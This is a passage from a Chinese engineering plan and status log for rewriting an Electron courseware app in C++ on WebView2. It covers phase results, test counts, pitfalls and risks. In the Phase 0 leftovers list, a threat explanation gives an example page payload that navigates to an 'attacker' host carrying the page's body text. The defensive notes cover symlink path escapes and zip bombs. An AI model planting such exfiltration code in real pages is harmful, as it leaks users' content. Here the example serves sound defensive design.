   探针再跑 ~0.35 s，合计约 **10.7 s**；**有图**（本例是内置大肥鱼）时 1 次就结束，约 **0.3 s**。
   所以探针超时预算要按最坏情况给——**统一按 45 s**（对齐 oracle 的 `ipc.js:998`），
   别按 headless 那套 16 s 虚拟时间来给，也别用 spike 里那个 30 s 默认值。
   （口径统一见下方"遗留"第 4 条。）
6. **Ninja 生成器不定义 `_DEBUG`**（不像 Visual Studio 工程）。`#ifdef _DEBUG` 裹着的
   CRT 泄漏检查会被整段编译掉——于是"Debug 跑完没有泄漏报告"是句假结论
   （踩过：故意漏 4 KB 也一声不响）。**做法**：CMake 里显式
   `target_compile_definitions(... $<$<CONFIG:Debug>:_DEBUG>)`，并链调试版 CRT。
7. **`_CrtDumpMemoryLeaks()` 别在 `wWinMain` 末尾调**：那时 `app` 之类的局部对象还活着，
   会被当成泄漏报出来。**做法**：只设 `_CRTDBG_LEAK_CHECK_DF`，让 CRT 在**退出时**写，
   把落盘通道 `_CrtSetReportFile` 指到一个自己开的文件上（那个句柄**故意不关**，它是报告的去处）。
   并且**先证明检测器会响**（`--leak-selftest` 故意漏 4 KB），再去说"没有泄漏"。
8. **`_CrtSetDbgFlag` 返回的是改之前的值**，拿它当"现在的状态"打印会得到"标志没设上"的假象。
   要读现状就再问一次 `_CRTDBG_REPORT_FLAG`。
9. **`SetVirtualHostNameToFolderMapping` 挂在 `ICoreWebView2_3` 上**，不是基础接口；
   要 `QueryInterface` 升上去。`CreateStreamOnHGlobal` 是 HRESULT + 出参，不是返回指针。
10. **本机环境**：cmake / ninja 都不在全局 PATH（在 `D:\visualstudio\Common7\IDE\...`），
    要 `call vcvars64.bat`；`.ps1` 必须带 **UTF-8 BOM**，否则 Windows PowerShell 5.1
    按 GBK 解码，中文注释会把解析器带崩、报一堆与真因无关的语法错。

#### 判据覆盖不到的地方（**"全部通过"不等于"什么都验了"**）

一次三路交叉审查（C++ 正确性 / 与纲领一致性 / 验证体系可信度）之后，把缺口如实列在这里，
免得后来的人把"结论：全部通过"读成比它本身更强的东西。**这些都不是"做错了"，是"还没做"。**

| 缺的东西 | 现状 | 该在什么时候补 |
|---|---|---|
| **`demo-probe.js` 从没被驱动过** | 夹具 `real-chapter.html` 里有 3 个 `.demo`、4 个滑块，现成可测 | Phase 0 就该有（属"探针体系能不能在 WebView2 里跑通"），**目前是缺口** |
| **`pet-probe.js` 从没被驱动过** | 夹具只覆盖"内置大肥鱼"一种形态；十一项必查要求"没图 / 有图 / fish"三种 | 同上 |
| **`load` 之后再读一次 `#s-total`** | `build-and-verify.md` 加粗要求过（防"题库渲染两遍"），两侧都没做 | 同上 |
| **多条探针同时注入时 `document.title` 的拼接顺序** | `verify-probe.js` 是**赋值** `=`，`demo-probe.js`/`pet-probe.js` 是**追加** `+=` —— 前者必须最先执行，否则会把后两条整段抹掉。Phase 0 只注了一条 | 同上。这是纯驱动层的顺序依赖，Phase 0 是唯一该验它的地方 |
| **"同目录没图"那条 10–13 s 的路径** | 夹具目录 **0 个 `<img>`**，而页面选了内置大肥鱼 → 探针第一次轮询就返回。坑 5 描述的那个失效模式**一次都没跑过** | Phase 0 |
| **截图只有明色一种、也没有任何检查** | `phase0-verify.ps1` 现在会断言"截图产出且非空"，但不看内容、不截深色 | 深色图留给 Phase 5（截图本来就"只能靠人眼"） |
| **判据 2 的证据是页面可写的 `document.title`** | 一个 `setInterval` 不停重设 title 的页面就能把它全绿（判据 3 的几何信息来自我们自己的脚本，不受影响） | Phase 5 把探针结果改走 `postMessage`/host object，或加一次性 nonce |
| **判据 5 只量了 exe** | 交付目录、安装包、内存三项**都没量**（脚本里已就地标注） | 交付目录 Phase 6；内存要等有真界面 |
| **`--no-csp` 会关掉"本地文件不被读出去"的唯一一道网** | 现在会在报告与 stdout 显式警告 | 保持；它是对照实验用的开关，别对真章节用 |

#### 遗留（带到 Phase 1 / 5 / 6）

> 这一节是"**已记账的没做**"，不是"做错了"。记它的理由是：Phase 0 的 spike 会被抽成
> `shell/`，**照着这份代码抽就会把没做的那几层一起丢掉**——而它们里有的连 Phase 0 的判据都不涉及。

1. **【必须记】探针窗口缺"导航守卫"这一层。** oracle 有：`verify/guard.js` + `runner.js:752`
   + `demo-checks.js:125` 都给隐藏窗口装 `will-navigate` / `will-redirect` / `setWindowOpenHandler`，
   理由是硬邦邦的——页面里一句 `location.href = 'https://attacker/?d=' + document.body.textContent`
   就能把读到的课件正文原样发出去，而**页面自己的 CSP 拦不住它**（`default-src 'none'` 对**导航**
   是空的，导航不属于 CSP 管的资源类型），审计留档在 `test/_audit/v6/t4-result.json`。
   Phase 0 的六项判据不涉及它（探针自己不跳转），所以 spike 里**一个字都没有**。
   **Phase 5 的 runner 必须复刻 `guard.js`**；抽 `shell/` 时也要把"探针窗口默认拒绝一切导航"带上。
   附带一条设计取舍：本工程把页面放在 `https://isg.local/`（**真实 scheme + 可解析域名**，`.local`
   还是 mDNS 域），处理器一旦没挂上，请求会真的走网络——是 **fail-open**；oracle 的 `isg://`
   在同样情形下是 **fail-closed**。目前的缓解是"把处理器真的被调到做成判据"
   （`docResponseServed_ > 0`，判据 4），但**设计取舍本身要落纸**。Phase 1 前决策一次：
   要么用 WebView2 的 `CoreWebView2CustomSchemeRegistration` 注册自定义 scheme 把
   `isg://local/…` 的形态与 fail-closed 语义拿回来，要么明确接受 fail-open 并写下来。
2. **【措辞必须改】探针窗口的存储隔离。** 这里原先写的是"用 `CreateCoreWebView2ControllerOptions`
   的**独立 profile**（等价 Electron 版的固定 partition 池 + 跑完 `clearStorageData`）"——
   **后半句是错的**：oracle 的实测结论恰恰是**不要再每次新建**（`runner.js:31-51`：
   原来每轮新起 `probe-<时间戳>-<随机>`，而 **Electron 从不回收 session**，代价实测
   **+1.29 MB 原生内存/次**；改成**固定 3 个 partition 轮转 + 每轮跑完 `clearStorageData()`**
   之后只要 +47 KB，**27 倍**差距，而且涨的是原生内存，只看 JS 堆根本发现不了）。
   **正确做法**：**固定池 + 每轮清空**，不是"每轮独立 profile"——后者会把这 1.29 MB/次 重造一遍。
   另：Phase 0 spike **完全没有隔离**（单 user-data、不清理）。实测残留是真的——连跑 3 次后
   `EBWebView\Default\Local Storage\leveldb\*.log` 里能看到 `https://isg.local` 的进度键；
   但**在这份夹具上三次运行的十一项读数完全一致**，所以是"已知道、已记账、影响未显形"。
3. **本地协议的 URL 形态换了，账要记。** oracle 是 `isg://local/<绝对路径分段>`（自定义标准协议），
   spike 是 `https://isg.local/<相对文件名>`（自建响应 + 目录白名单）。§4.3 明确要求
   "渲染层必须动的那 2–3 处，每一处都要在文档里写明为什么"——这一处就是其中一处。
4. **探针超时的口径有三个数并存**，得统一：本纲领这里写 **20 s**、spike 默认 `--timeout-ms 30000`
   （另有一个 `pollCount_>=400` ≈ 60 s 的硬上限）、oracle 的 `ipc.js:998` 传的是 **45000**。
   实测依据：同目录没图时探针要轮询满 40×250 ms（**10–13 s**），有图时约 3 s。
   建议统一按 **45 s**（对齐 oracle）并在 `build-and-verify.md` 里写死一个数。
5. **探针的完成标记被写死进 C++ 了。** oracle 的 `runner.js:121-142` 有个 `markersOf()`，
   从探针**源码文本**里探测 `【探针】`/`【异步`/`【演示探针】` 来决定"什么时候算跑完"，
   注释写着"**不写死探针名**"；而且它的同步段判据是 title **以**`【探针】`**开头**，
   spike 用的是"**包含**"（更宽）。Phase 0 只有一组固定探针，可以接受；
   **Phase 5 要换回 `markersOf` 的做法**，否则"换了探针集合、判据还按老标记等"又是一次静默失效。
6. **浏览器进程残留 0.2–6.7 s**：我们自己的宿主进程退得干净（尾巴 ~50 ms），
   残留的是 WebView2 的 `msedgewebview2.exe`，按它自己的节奏退场（估计与 profile 落盘有关）。
   应用是单实例，用户主要看到的是"任务管理器里还有 msedgewebview2"。
   **Phase 6 打包时实机复验一次**；如果观感有问题，再查能不能缩短。
7. **白名单只有词法一遍，没有 `realpath` 那一遍。** `GetFullPathNameW` 只做词法折叠，
   **不解析重解析点**：被测目录里只要有一个指向外部的 junction / 符号链接，
   `dir\link\secret.txt` 词法上仍在 `dir\` 之下、检查通过、`CreateFileW` 却真读到外面。
   oracle 的 `preview.js:80-98` **判两次**（词法前缀 + `realpath` 前缀），注释写明
   "**光做字符串前缀比较是不够的**"，审计留档在 `test/_audit/v2/t1b-preview-case-link.js`。
   Phase 0 的实际暴露面接近零（放行根由操作者用命令行指定、不含 junction、不含用户内容），
   **但 Phase 1 会照这份代码写 `shell/`** —— 升级成句柄反查
   （`GetFinalPathNameByHandleW` 后再比前缀，或逐段查 `FILE_ATTRIBUTE_REPARSE_POINT`）。
   **这一条是从 oracle 抄回来的坑，§7.1 里原来没有。**

### Phase 1 — 立壳 ✅ **已完成（2026-10-17）**

CMake + vcpkg 工程；单实例；主窗口 + 离屏探针窗口；本地协议（白名单 + CSP）；
`window.isg` 的 31 个 invoke 通道 + 1 个 `job:event` 订阅全部登记（未实现的明确报错）；
settings.json + DPAPI + `.env` 叠加 + 导入导出（白名单）；
渲染层原样搬入并跑通：能开窗、能进设置页、能存、能选文件、能换背景图。
**同时把金标准对拍夹具搭起来**（§4.2）——它现在只用得上 `assemble`，但要在这一阶段跑通链路。

**DoD**：设置/背景图/env/Key 不外漏 四套自测的等价检查通过；体积与启动达标（§3.5）。

#### 结果（一条命令：`powershell -File tools\phase1-verify.ps1`，报告在 `docs/phase1-report.md`）

| # | 判据 | 证据 |
|---|---|---|
| 1 | 四套等价自测 | settings 19 / background 30 / env 27 / key-leak 10，全过（settings 里 5 条是"数组容错"回归） |
| 2 | 31 个通道全登记、未实现明确报错 | bridge 51 项（含"每个通道都走到了一个明确分支"、通道名无重复、与页面侧 31 个方法一一对应） |
| 3 | 真页面端到端 | ui 35 项：桥、信封、五个视图**各自的标题**、`isg://` 文档真的加载、宿主统计的 CSP |
| 4 | 协议与白名单 | protocol 14 项（7 种越界形态 + 正常形态 roundtrip）；protocol-live 5 项（**导航**驱动 handler：放行→200+CSP、未放行→403 且 `deniedCount>0`） |
| 5 | **老配置可直接读（双向）** | Electron 写 → C++ 读；C++ 写 → Electron 读 |
| 6 | **金标准对拍** | 两侧 157557 字节、sha256 `c05a28cf…` **逐字节相同**；基准现场重生成（退出码 + 指纹 + 新鲜度） |
| 7 | 资产不走散 | `sync-web`（含补丁清单与必需 id）/ `gen-providers` / `bundle-logic` 三道检查；`dist/web` 与 `web/` 逐文件哈希 |
| 8 | **离屏探针窗口** | probe 3 项：独立 environment + 独立 user data + 自己的协议安装，加载 `isg://` 并读回 `document.title` |
| 9 | **关得干净 / 不漏** | Debug 构建：`--leak-selftest` 自证检测器会响（4 KB 出现在报告里）；正常路径零泄漏 |
| 10 | 体积 | 交付目录 **~1.33 MB**（exe ~792 KB + web 601 KB；skill/docs/pdfium 未计，Phase 6） |
| 11 | 启动 | 控制器就绪 **~440 ms**、页面就绪 **~600 ms**、收尾 ~3.0 s（口径见 `phase1-design.md` §8.9） |
| 12 | 构建零告警 | 第三方头标 `SYSTEM`，自有代码 `/W4` 零告警（含 LNK/CMake/D1） |

**三路交叉互验之后**（用户授权在每个阶段交付时开一次）修掉了 12 项，其中两条是判据全绿时
就存在的真 bug（桥的来源比较把 URL hash 算进去了 → 切到设置页后所有调用被静默丢弃；
单实例的信箱窗口用 `EnumWindows` 根本枚举不到）。详见 `phase1-design.md` §10。

设计与差异记账（**必读**）：[`docs/phase1-design.md`](phase1-design.md)。

#### Phase 1 的四个"计划外"结论（都是实测，不是估计）

1. **Key 的落盘格式不是裸 DPAPI，是 Chromium OSCrypt**：`"v10"` + 12 字节 nonce +
   AES-256-GCM + 16 字节 tag；AES 密钥用 DPAPI 保护后存在 `<userData>/Local State`
   的 `os_crypt.encrypted_key` 里。
   **只有"让 oracle 真的写一份、新实现去读"才能发现**——自己加密自己解密的测试永远发现不了
   （第一版按裸 DPAPI 实现，自测全绿，跨实现测试当场证伪）。已实现并双向验证。
2. **WebView2 的 `ExecuteScript` 不等 Promise**（Electron 的 `executeJavaScript` 会等）。
   照搬 Electron 那套只会得到 `{}`，看上去像脚本什么都没干。
3. **`PostWebMessageAsJson` 会把对象的键重排**（Chromium 的 `base::Value` 字典按键名排序）。
   它不影响"内容对不对"，但**会让 Phase 4 的"逐字节相同"直接不成立**——金标准对拍在 Phase 1
   就把这条抓出来了，否则会等到 Phase 4 才以一种很难查的方式爆出来。
4. **在 WebView2 的回调栈上做同步的宿主→渲染进程调用会重入死锁**（`NavigationCompleted` /
   `ExecuteScript` 的回调里调 `PostWebMessageAsJson`）：进程活着、窗口在、日志停在上一行，
   连超时兜底都轮不到。做法：一切宿主→页面的调用都从**计时器那一拍**发。

#### 对 §5「Phase 0 遗留」的处置

- **遗留 1（本地协议形态：fail-open 还是 fail-closed）→ 已决策**：用 `CoreWebView2CustomSchemeRegistration`
  登记自定义 scheme `isg://`，请求全部自己服务（**fail-closed**）。判据看结果：`docResponseServed > 0`。
- **遗留 3（URL 形态换了要记账）→ 已记账**：见 `phase1-design.md` §2.2。
- **遗留 7（白名单只有词法一遍，没有 realpath）→ 已修**：改成按句柄反查
  （`GetFinalPathNameByHandleW`），并用 7 种越界形态自撞过。
- 遗留 2 / 4 / 5 / 6 属探针窗口与打包（Phase 5 / 6），**仍未做**，保持原状。

#### Phase 1 新记账（带到 Phase 2 起）

1. **`settings:test` / `gen:*` / `run:*` / `book:*` / `extract:preview` / `verify:run` 未实现**
   （**Phase 2 已实现 `extract:preview`**，其余仍按原样），
   一律返回 `NOT_IMPLEMENTED` 且**说明属于哪一阶段**。副作用：界面启动时会看到一条
   「读取任务列表」失败提示（`restoreLastJob` 会调 `listJobs`）——这是刻意的，
   静默返回空数组会让"没有任务"和"功能没做"分不开。Phase 4 接上后消失。
2. **标题栏深浅色不跟随页面主题**：渲染层的主题在它自己的 localStorage 里，宿主读不到。
   等 Phase 4/5 铺开界面 ↔ 宿主的通道再加一条"主题变了"的事件。
3. **`skill/` 与 `docs/generation-contract.md` 还没进交付目录**：Phase 1 用不到，
   Phase 6 打包时按 `docs/README.md` 的安排拷入。
4. **`assemble.js` 用了 Node 专有的 `Buffer.byteLength`**：Phase 4 在 Worker 里跑它时必须有垫片
   （现在垫片在 `tools/golden/bundle-logic.js` 里，只影响对拍，不影响产品）——
   **这不是"纯逻辑 JS 与环境无关"的反例，是"只有跑过才知道"的反例**。

### Phase 2 — 抽取 ✅ **实现完成（2026-10-17），DoD 有一条记账的缺口**

PDFium 抽文本 + 版面还原；PPTX（miniz + 原样的切标签状态机）；质量信号与 warnings 一一对应；
抽取预览视图可用可编辑；`extract:preview` 走 工作线程 → UI 线程回包（不卡界面）。

**DoD**：拿仓库里的真 PDF，**与 JS 版逐页文本对拍**——正文字符串相似度 >99%，且**栏序一致**。

#### 结果（一条命令：`powershell -File tools\phase1-verify.ps1 -SampleDir <课件目录>`，干净构建，**91 条判据全过**）

| 判据 | 实测 |
|---|---|
| `--selftest=extract`（合成夹具） | **33/33**（MD/GBK/错误上下文/PPTX 顺序+表格/坏 PDF） |
| `--selftest=extract-pdf`（真 PDF） | **11/11**（33 页 / 26MB 143 页；缺样本时明确跳过整条） |
| `--selftest=ui`（新增抽取预览段） | **46/46**（11 条：未放行路径被拒、textarea 改动进 extractEdits 等） |
| 三份真 PDF 的页数 / 每页 `reasons` / `suspect` | **全部一致**（33/25/143 页，0 不一致） |
| 两份 DoD 样本的每页 `columns` | **0 不一致** |
| 总字符数比值（C++ / oracle） | 1.0066、0.9899、1.0638（第三份是压力样本） |
| 去空白后的比值 | 1.0121、1.0000、1.0106 |
| **整页/逐页内容丢失** | `emptyMismatch=0`、`contentLossPages=0`（三份都 0） |
| **逐页相似度中位数** | **0.9971、1.0000**；143 页压力样本 0.9815 |
| 去空白后的中位数 | 1.0000、1.0000、1.0000 |
| ≥0.99 的页数 / 低相似度页 | 21/33（12 低）、15/25（10 低）、60/143（83 低） |

**DoD 缺口（必须写明）**：逐页 >99% **没有达到**。03-1 最低页是第 22 页 0.2648，03-2 最低 0.8822。
公式/表格页的阅读顺序在 `pdf.js 的 item（一次 showText 一个 transform）`与
`PDFium 的逐字符 origin`之间不同，导致 `SequenceMatcher` 很低，但**不是丢字**：
`emptyMismatch=0`、`contentLossPages=0`，去空白后的中位数三份都是 1.0。
要逐页 >99%，需要另做 PDFium 的文本 run 重建，不要混进 Phase 3。
低相似度页逐页列在 `_verify-out/phase2/cmp-*.json` 的 `lowPages`。

与 oracle 的必要差异（逐条理由见 [`phase2-report.md`](phase2-report.md) §2.2）：
`FPDFText_GetText` 会压缩输出 → 改用逐字符 `GetUnicode`；增补平面字符要合并代理项对；
字宽用 advance 而不是包围盒（全角 1.3em、破折号两侧不插空格）；UTF-8 续字节不能当 NBSP；
PUA 按文本对象统计；栏缝阈值收紧到 10% 页宽并把横跨栏缝的行保留（oracle 会静默丢掉它们）；
`text.js` 因编码识别属于宿主能力而在 C++ 重写（纯切页逻辑不是逐字节拷贝，Phase 4 再搬回 Worker）。

**三路交叉验证（2026-10-17）**修掉的实打实问题：线程入口异常直通 `std::terminate`；
zip 解压炸弹（单条目/累计/条目数上限）；已完成的抽取线程不回收（句柄泄漏）；
`normaliseForRepeat` 逐位替换数字导致页眉页脚剔除不完整；PPTX/文本取消语义不一致；
`reply` 闭包捕获 `this`；验证器只读 `cmp` 数字、两页整页丢字仍全绿；增量构建下“零告警”是空判据；
缺少 `checked`/`test` 对账、输入 SHA256 绑定、`emptyMismatch`/`contentLossPages` 判据。
详见 `phase2-report.md` §2.3。

### Phase 3 — 网络与任务 ✅ **实现完成（2026-10-17）**

WinHTTP + SSE（**SSE 分帧/重试/降级原样跑 oracle 的 `llm/index.js`**，C++ 只做字节搬运）；
重试/退避/`Retry-After`/400 参数降级/`emitted===0` 才允许重试/取消令牌；
`jobs` 等价物 + 事件广播；运行视图（进度/日志/流式/取消）；`testConnection`；providers 预设表。

**DoD 结果**：复用 `test/mock-provider.js` 的整条流水线跑通（`pipeline-mock` 23 条）；
`net-fault` 26 条覆盖 request-shape / llm-smoke / SSE 切包 / 400 降级 / 429 重试 /
`data: 0` 保活行；`pipeline-cancel` 9 条（约 0.26 秒内 running → canceled）。
**记账缺口**：`numeric-cases` 测的是页面判分引擎，需要 Phase 5 的探针窗口；
`emitted>0 后不重试` 沿用 oracle 代码，未单独造故障验；Anthropic 请求形状未单独验（适配器逐字节复制）。
详见 [`phase3-report.md`](phase3-report.md)。

### Phase 4 — 流水线与拼装 ✅ **实现完成（2026-10-17）**

`prompts.js` 等价物（**逐字节一致**）；8 阶段编排、并发限流、取消；
`assemble.js`（锚点断言 / 转义 / 清洗 / 进度搬家脚本）；`bank` 校验；`auditBank` 计票规则。

**DoD 结果**：**金标准对拍仍是逐字节相同**（157557 字节，sha256 `c05a28cf…`）；
`audit-pass` 等价回归通过：假模型先写 999 → 独立审题确认 → 重出 200 →
最终页面有 200、没有 999；`audit.rounds=5`、`audit.high=1`、调用计数 16。
`verify`/`repair`（Phase 5）与 `book`（Phase 6）是**明确记账的缺口**，不是静默跳过。
详见 [`phase4-report.md`](phase4-report.md)。

### Phase 5 — 校验与修复闭环 ✅ **实现完成（2026-10-17）**

探针窗口驱动 + title 解析 + DOM facts；`demo-checks`（0.5% 容差比对）；repair 回灌（最多 2 轮）。

**DoD 结果**：`--selftest=e2e-mock`（**真 PDF 33 页** → 真抽取 → 真拼装 → **真探针** → 假模型）
31 条全过；`--selftest=verify` 20 条（含"把题库脚本改坏必须报错"的反例）；
`--selftest=pipeline-repair` 31 条（代理把演示 checks 持续写坏 → demo-checks 抓到 →
修复轮真的重出 → 如实写「仍有 1 项没过」）；`pipeline-mock` 升到 28 条
（宿主对 `job.report.items`、demo-checks、verify 阶段状态独立对账）。

探针副本按"谁创建的"决定是否删除；demo 核对加载原页面时**绝不删**。
同时修掉两处 oracle 侧静默回归：多章映射丢了 `checks`（演示核对整轮失效）、
旁挂数据的章号只认 `no`（带过来的章退化成数组序号）。
详见 [`phase5-report.md`](phase5-report.md) 与 [`guidance7.md`](guidance7.md)。

### Phase 6 — 收尾功能 ✅ **实现完成（2026-10-17）**

多来源与独立分析；多章（合成一册 / 每章一份）；带上以前那些章；旁挂 `.isg.json`；清理；
导入导出；计费预估；`about`；打包 NSIS + portable。

**DoD 结果**：`book-e2e` 28 条（第 13 章冻结 id 逐字保留、第 14 章落在 `c2-…`、
进度搬家脚本在、第 13/14 章号都在）；`book`（真窗口通道）20 条、`book-data` 20 条、
`cleanup` 26 条、`multi-source` 8 条；`pipeline-mock` / `book-e2e` 与假模型端到端。
两章都有演示时后一个 `demoA` 被改成 `demoB`，demo-checks 用最终 id 核对（第二册 42 项无 false）。
便携目录 **10.79 MB**、zip **5.08 MB**；NSIS 因本机没有 `makensis.exe` **明确跳过**
（`tools/package.ps1` 已就绪）。
详见 [`phase6-report.md`](phase6-report.md)。

**总计：约 8–12 周**（一人全职）。这不是一个周末项目——但因为 JS 版是 oracle，它是**可验证地安全**的。

---

## 6. 模块映射表

| 现有文件 | 行数 | 去向 |
|---|---|---|
| `renderer/**`（全部） | 8,330 | **原样搬**（`window.isg` 由 C++ 实现） |
| `pipeline/assemble.js` | 1,348 | **原样搬进 Worker**（金标准对拍的头号目标） |
| `pipeline/revive.js` | 976 | **原样搬**（自述纯函数，几乎零改动） |
| `pipeline/prompts.js` | 719 | **原样搬**（读磁盘改为读预热的 skill 快照） |
| `pipeline/bank.js` `chapters.js` `sources.js` | 865 | **原样搬** |
| `llm/openai.js` `anthropic.js` `providers.js` | 1,353 | **原样搬**（协议适配与请求体构造）；传输层换成 C++ |
| `llm/index.js` | 1,295 | **拆**：SSE 状态机/重试/降级策略 → 原样搬进 Worker；`fetch` 传输 → C++ |
| `extract/text.js` | 209 | **原样搬** |
| `verify/inject.js` `guard.js` | 163 | **原样搬**（逐条复刻 `inject-probe.py`） |
| `pipeline/index.js` | 2,046 | **拆**：阶段编排/校验器 → Worker；I/O 与任务生命周期 → C++ |
| `extract/pdf.js` | 528 | **重写**（PDFium）——**唯一必须重新推导的算法** |
| `extract/pptx.js` | 317 | **重写**（miniz + pugixml）；`orderedSlideParts` 的 rels 排序逻辑照抄 |
| `verify/runner.js` `demo-checks.js` | 1,052 | **重写**（WebView2 驱动）；title 解析与 0.5% 容差逻辑照抄 |
| `ipc.js` | 1,009 | **重写**（31 个 invoke 通道 + `job:event` 订阅 → C++ 路由） |
| `store.js` | 839 | **重写**（DPAPI）；**白名单挑字段与掩码逻辑照抄** |
| `jobs.js` `book.js` `cleanup.js` `bg.js` `env.js` `skill.js` `preview.js` | 2,125 | **重写**（系统能力） |
| `main.js` `lifecycle.js` `version.js` `pending.js` `smoke.js` | 722 | **重写**（窗口与生命周期） |
| `extract/index.js` `preload.js` | 410 | **重写**（抽取入口归 C++；preload → C++ 侧的桥） |

**一句话**：约 **14.0k 行逐字节搬**，约 **3.3k 行拆开搬**（状态机与策略搬走、传输换成 C++），
约 **7.0k 行重写**——而重写里绝大多数是 I/O 胶水，**真正有算法难度的只有 `pdf.js`(528) +
`pptx.js`(317) + `verify/runner.js`+`demo-checks.js`(1,052) 这约 1.9k 行。**

---

## 7. 必须继承的坑（血泪清单）

### 7.1 应用侧的坑（重写时最容易重新踩一遍）

1. **userData 路径必须是纯 ASCII。** Electron 拿中文 `productName` 当目录名 →
   Chromium 初始化 `%APPDATA%\讲练一体工作台` 时报 `Unable to move the cache: 拒绝访问`，
   **进程静默退出、退出码 0**，用户只看到"闪一下就没了"。
   WebView2 的 user data folder 同理——**继续用 `%APPDATA%\isg-studio`**，显示名保持中文。
2. **单实例**：第二个实例要把命令行里的文件交给已开实例（`openIncoming`），并且**两条路一起走**——
   存进 pending（解决"首启时事件比监听器先到"）+ 推一次事件（覆盖"已经在跑、又拖进来一个"）。
   只走一条，整条链路就是死的。
3. **探针副本必须与被测 HTML 同目录**，否则相对路径图片加载失败，
   **陪练/背景会被误报成"没有"**（现在有个"优先同目录、否则 tmpdir"的兜底，要照搬并理解原因）。
4. **每次校验用全新的隔离存储**（现在用新 `partition` + 跑完 `clearStorageData`）。
   否则上一轮的 localStorage 进度残留，探针读到的计数是错的。
5. **导出/传渲染进程要白名单式挑字段**，不是"整体复制再删一个"（审计实测漏过 Key）。
6. **输出文件名净化 + 断言落在输出目录内**（模型给的章号可以是路径穿越）。
7. **CSP 两处都要**：预览响应头 + 生成页 `<head>` 的 meta。
8. **后台窗口的定时器与遮挡**：探针依赖 `setTimeout` 轮询（最多 40×250ms），
   必须加 `--disable-background-timer-throttling`，否则隐藏窗口里计时器被降频甚至冻结。

### 7.2 PDF 版面还原（唯一必须重新推导的地方）

`extract/pdf.js` 在 pdf.js 的 `items + transform` 之上做了一整套版面启发式：
`itemsToLines`(158) → 分栏 `findGutter`(229)/`readOrder`(249) → 页眉页脚
`markMarginLines`(298)/`findRunningLines`(305) → PUA 字符统计 `countPuaInWords`(133)，
每页 `cleanup()` 防内存涨、每 5 页让出事件循环（`setImmediate`）。

换到 PDFium 后，等价的原始信息要从 `FPDFText_GetCharBox` / `FPDFText_GetCharOrigin` /
`FPDFText_CountChars` 取（**逐字符盒子**，比 pdf.js 的 item 更细）。
**这些阈值（行距、栏间空隙、页边距比例）要拿真课件重新校准**，不能照抄数字。

**DoD 就是 §5 Phase 2 的逐页对拍**——相似度 >99% 且栏序一致。

### 7.3 生成页侧的坑（由 skill 管，但应用必须复刻行为）

这些坑在 `references/pitfalls.md` 里有 80+ 条。应用侧**至少要理解**这几条，因为它们是应用代码行为的依据：

- **锚点断言**：骨架被改过 / 模型抄了骨架原文，两种情况的报错文案要能区分。
- **题库字段校验**：`badReason` 逐题校验，不合格的题标红跳过并告警，不影响其余题目与页面功能。
- **进度搬家脚本**：带上旧章时要生成 `migrationScript` + `migrationFingerprint`，
  用来把旧存盘键的数据搬到新键（**老章零改名**是硬规则）。
- **数值容错**：`1.06`、`1.06 T`、`2.51e-4`、`2.51×10⁻⁴`、`1,06`、全角数字 `１５`、印刷体负号 `−5` 都认；
  写算式（`5-3`、`1/2`）要明确告知"只认一个数字"，而不是含糊地判错。

### 7.4 过渡期的单一真源纪律

在 C++ 版完全接管之前，**JS 版是源，C++ 工程里的 JS 是拷贝**：

- 改逻辑 → **先改 `apps/isg-studio/src/main/...`**，跑通 JS 版自测，再同步到新工程；
- 新工程里加一个 `tools/check-logic-sync.*`，比对两边拷贝**逐字节一致**，不一致就报警。
  （这条是照搬这个项目自己的哲学：`assets/sync-skeleton.py` 默认只检查、`--write` 才写。
  **两边走散的症状是"改了资产、新章却还是老引擎"——在这个项目里已经有前科了。**）
- C++ 侧需要的适配（`fs`/`path` 垫片）只加在 `web/logic/shims/` 下，**不改原文件**。

---

## 8. 风险登记册

| # | 风险 | 影响 | 对策 | 何时处理 |
|---|---|---|---|---|
| 1 | 探针在离屏 WebView2 里跑不通（几何信息被停） | **致命**：自动校验没了 | 屏外可见窗口 + 两个 Chromium 开关；备选走系统 Edge headless | **Phase 0** |
| 2 | PDF 版面还原校准不到位 | 抽取质量下降，用户看到串行的多栏文本 | 逐页对拍；预览视图可编辑兜底 | Phase 2 |
| 3 | SSE 分帧边界漏掉 | 生成中途静默失败/重复内容 | 照抄状态机 + 切包用例；`emitted===0` 才重试 | Phase 3 |
| 4 | 拖拽文件拿不到本地路径 | 核心交互（拖课件进来）失效 | `NewWindowRequested` + `PathCreateFromUrlW`，或自建 `IDropTarget` | Phase 1 |
| 5 | 同步 `fs` 在 Worker 里不可用 | 逻辑层搬不过去 | **预热**：启动时把 skill 全量读成 JSON 传给 Worker（§3.2） | Phase 1 |
| 6 | 提示词/契约在搬运中被改动 | 生成质量不可比，且难发现 | §4.6 反模式第 1 条；对拍覆盖 prompts 输出 | 全程 |
| 7 | WebView2 运行时缺失（老 Win10） | 装完打不开 | Win11 自带；缺失时装 ~2 MB bootstrapper；**不要用 fixed-version**（130–220 MB，白干） | Phase 6 |
| 8 | macOS 需要另一套 shell | 无法在 Windows 上交叉构建 | 先只做 Windows；要跨平台再评估 saucer | 决策点 |
| 9 | 内存收益被高估 | 预期落空 | §3.5 的诚实数字：**只降三成** | 沟通 |
| 10 | 对拍出现"无法解释的差异" | 说明有隐藏依赖（时间/随机/本地化） | 每处差异都要记账；不许"差不多就行" | Phase 1 起 |

---

## 9. 完成定义（DoD 总表）

重写完成的判据是**下面全部成立**，缺一条都不算：

- [ ] §3.5 的六项硬指标全部达标（体积 / 安装包 / 内存 / 冷启 / 热启 / 老配置可读）
- [ ] `assemble` 金标准对拍**逐字节相同**（差异项已列举并记账）
- [ ] `e2e-mock` 的等价端到端全绿（真 PDF → 真拼装 → 真探针 → 假模型）
- [ ] 十一项必查在真实章节课件上跑通，报告与应用内展示一致
- [ ] 16 套自测各有等价物或明确的"不适用"理由（逐条列出来）
- [ ] 敌意输入与 Key 不外漏两套的等价检查通过
- [ ] skill 目录**运行期从磁盘读**（改 skill 不改代码，实测一遍证明）
- [ ] 生成产物在一个真实的手机浏览器上打开正常（这是产品的最终使用场景）
- [ ] 老用户的 `settings.json` / `history.json` 直接可用，无需迁移
- [ ] 新工程里的 JS 拷贝与 JS 版**逐字节一致**（同步检查器为绿）

---

## 10. 给继任者的第一件事

> 📓 **另见六份工作记录**（本文件是结论，那些是过程；很多结论"为什么可信"的答案在过程里）：
>
> - [`guidance1.md`](guidance1.md) —— Phase 0 的过程：spike、CSP 的 A/B、那次"真实产物上的假绿"。
> - [`guidance2.md`](guidance2.md) —— Phase 1 的过程：
>   跨实现 Key 兼容怎么把"DPAPI"实现当场证伪（其实它是 Chromium OSCrypt）、
>   金标准对拍抓到的三件"光读代码看不出来"的事、三路交叉互验审出的 22 项
